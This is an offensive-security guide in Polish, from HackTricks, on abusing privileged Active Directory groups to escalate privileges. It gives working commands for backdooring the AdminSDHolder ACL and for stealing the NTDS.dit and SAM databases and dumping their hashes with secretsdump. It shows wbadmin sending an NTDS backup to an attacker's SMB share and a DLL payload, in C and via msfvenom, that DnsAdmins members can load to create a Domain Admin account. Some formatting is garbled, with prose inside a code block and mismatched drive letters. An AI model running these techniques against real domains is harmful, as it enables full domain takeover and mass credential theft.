# Grupy uprzywilejowane

{{#include ../../banners/hacktricks-training.md}}

## Znane grupy z uprawnieniami administracyjnymi

- **Administratorzy**
- **Administratorzy domeny**
- **Administratorzy przedsiębiorstwa**

## Operatorzy kont

Grupa ta ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Dodatkowo umożliwia lokalne logowanie do Kontrolera Domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodawanie nowych użytkowników jest dozwolone, a także lokalne logowanie do DC01.

## Grupa AdminSDHolder

Lista Kontroli Dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustala uprawnienia dla wszystkich "chronionych grup" w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.

Atakujący mógłby to wykorzystać, modyfikując ACL grupy **AdminSDHolder**, przyznając pełne uprawnienia standardowemu użytkownikowi. To skutecznie dałoby temu użytkownikowi pełną kontrolę nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny z powodu konstrukcji systemu.

Polecenia do przeglądania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Dostępny jest skrypt, który przyspiesza proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Aby uzyskać więcej szczegółów, odwiedź [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Kosz na AD

Członkostwo w tej grupie umożliwia odczyt usuniętych obiektów Active Directory, co może ujawnić wrażliwe informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Dostęp do Kontrolera Domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik jest częścią grupy `Server Operators`, co zmienia poziom dostępu.

### Eskalacja Uprawnień

Używając `PsService` lub `sc` z Sysinternals, można sprawdzić i zmodyfikować uprawnienia usług. Grupa `Server Operators`, na przykład, ma pełną kontrolę nad niektórymi usługami, co pozwala na wykonywanie dowolnych poleceń i eskalację uprawnień:
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia manipulację usługami w celu uzyskania podwyższonych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Te uprawnienia umożliwiają przechodzenie przez foldery, wyświetlanie listy oraz kopiowanie plików, nawet bez wyraźnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Wykorzystanie konkretnych skryptów jest konieczne w tym procesie.

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, stosuje się następujące kroki:

1. Importuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp i skopiuj pliki z zastrzeżonych katalogów, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Bezpośredni dostęp do systemu plików kontrolera domeny umożliwia kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM dla użytkowników i komputerów w domenie.

#### Using diskshadow.exe

1. Create a shadow copy of the `C` drive:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z kopii zapasowej:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie, użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu odzyskania haszy:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashe z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Używanie wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zbuforuj poświadczenia SMB na maszynie docelowej.
2. Użyj `wbadmin.exe` do tworzenia kopii zapasowej systemu i ekstrakcji `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Aby zobaczyć praktyczną demonstrację, zobacz [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnego DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Ta zdolność pozwala na znaczny potencjał do eksploatacji.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Wykonaj dowolny DLL

Członkowie mogą sprawić, że serwer DNS załaduje dowolny DLL (lokalnie lub z zdalnego udostępnienia) za pomocą poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Restartowanie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby DLL mogła zostać załadowana:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Dla uzyskania dalszych informacji na temat tego wektora ataku, odwołaj się do ired.team.

#### Mimilib.dll

Możliwe jest również użycie mimilib.dll do wykonania poleceń, modyfikując go w celu wykonania konkretnych poleceń lub odwrotnych powłok. [Sprawdź ten post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) w celu uzyskania dalszych informacji.

### Rekord WPAD dla MitM

DnsAdmins mogą manipulować rekordami DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokad zapytań. Narzędzia takie jak Responder lub Inveigh mogą być używane do fałszowania i przechwytywania ruchu sieciowego.

### Czytelnicy dzienników zdarzeń
Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajdując wrażliwe informacje, takie jak hasła w postaci tekstu jawnego lub szczegóły wykonania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ta grupa może modyfikować DACL na obiekcie domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę są szczegółowo opisane w repozytorium Exchange-AD-Privesc na GitHubie.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Administratorzy Hyper-V mają pełny dostęp do Hyper-V, co może być wykorzystane do przejęcia kontroli nad wirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie aktywnych kontrolerów domeny i wydobywanie haszy NTLM z pliku NTDS.dit.

### Przykład wykorzystania

Usługa konserwacyjna Mozilla Firefox może być wykorzystywana przez administratorów Hyper-V do wykonywania poleceń jako SYSTEM. Polega to na utworzeniu twardego linku do chronionego pliku SYSTEM i zastąpieniu go złośliwym plikiem wykonywalnym:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Wykorzystanie twardych linków zostało złagodzone w ostatnich aktualizacjach systemu Windows.

## Zarządzanie Organizacją

W środowiskach, w których zainstalowany jest **Microsoft Exchange**, specjalna grupa znana jako **Organization Management** ma znaczące uprawnienia. Grupa ta ma prawo do **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** i utrzymuje **pełną kontrolę nad jednostką organizacyjną 'Microsoft Exchange Security Groups'** (OU). Kontrola ta obejmuje grupę **`Exchange Windows Permissions`**, która może być wykorzystana do eskalacji uprawnień.

### Wykorzystanie Uprawnień i Komendy

#### Operatorzy Drukarek

Członkowie grupy **Print Operators** mają przyznane kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im na **lokalne logowanie się do kontrolera domeny**, jego wyłączanie oraz zarządzanie drukarkami. Aby wykorzystać te uprawnienia, szczególnie jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższonych uprawnień, konieczne jest ominięcie Kontroli Konta Użytkownika (UAC).

Aby wylistować członków tej grupy, używa się następującej komendy PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Aby uzyskać bardziej szczegółowe techniki eksploatacji związane z **`SeLoadDriverPrivilege`**, należy skonsultować się z konkretnymi zasobami bezpieczeństwa.

#### Użytkownicy pulpitu zdalnego

Członkowie tej grupy mają dostęp do komputerów za pośrednictwem protokołu pulpitu zdalnego (RDP). Aby wylistować tych członków, dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych zasobach pentestingowych.

#### Użytkownicy zdalnego zarządzania

Członkowie mogą uzyskiwać dostęp do komputerów za pomocą **Windows Remote Management (WinRM)**. Wykrywanie tych członków osiąga się poprzez:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Aby uzyskać informacje na temat technik eksploatacji związanych z **WinRM**, należy skonsultować się z odpowiednią dokumentacją.

#### Operatorzy serwera

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu. Aby wylistować członków, użyj podanego polecenia:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
